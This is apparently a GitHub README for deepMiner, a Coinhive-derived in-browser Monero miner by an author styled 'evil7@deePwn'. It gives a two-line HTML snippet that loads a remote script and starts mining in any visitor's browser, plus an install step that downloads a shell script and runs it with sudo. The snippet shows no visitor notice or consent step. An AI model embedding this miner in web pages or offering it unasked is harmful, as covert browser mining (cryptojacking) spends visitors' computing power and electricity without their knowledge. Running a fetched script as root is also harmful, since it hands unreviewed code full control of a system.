# deepMiner

```acsii

:::::::-.  .,:::::: .,::::::::::::::::. .        :   ::::::.    :::..,:::::: :::::::..   
 ;;,   `';,;;;;'''' ;;;;'''' `;;;```.;;;;;,.    ;;;  ;;;`;;;;,  `;;;;;;;'''' ;;;;``;;;;  
 `[[     [[ [[cccc   [[cccc   `]]nnn]]' [[[[, ,[[[[, [[[  [[[[[. '[[ [[cccc   [[[,/[[['  
  $$,    $$ $$""""   $$""""    $$$""    $$$$$$$$"$$$ $$$  $$$ "Y$c$$ $$""""   $$$$$$c    
  888_,o8P' 888oo,__ 888oo,__  888o     888 Y88" 888o888  888    Y88 888oo,__ 888b "88bo,
  MMMMP"`   """"YUMMM""""YUMMM YMMMb    MMM  M'  "MMMMMM  MMM     YM """"YUMMMMMMM   "W" 

  deepMiner
  Forked from coinhive.com
  Worker for own Pool or personal XMR Wallet
  By evil7@deePwn

----------------------------------------------------------------------------------------

```

## Usage

* Add a script inmport `https://deepminer.herokuapp.com/deepMiner.js`

* Add another script and write down :

```html
<script src="https://deepminer.herokuapp.com/deepMiner.js"></script>
<script>
    var miner = new deepMiner.Anonymous('deepMiner_test').start();
</script>
```

* All done! XD~ Let's build our srv by self

## Install

```bash
curl https://raw.githubusercontent.com/deepwn/deepMiner/master/install.sh > install.sh
sudo sh install.sh
```

## Example

<https://deepminer.herokuapp.com/demo.html>

## Source

```acsii
deepMiner.git
.
|-- README.md
|-- banner
|-- config.json
|-- package-lock.json
|-- package.json
|-- server.js
|__ web
    |-- 404.html
    |-- deepMiner.js
    |-- demo.html
    |-- index.html
    |-- lib
    |   |-- cryptonight-asmjs.min.js
    |   |__ cryptonight.wasm
    |__ worker.js
```

## Latest

2017-10-10
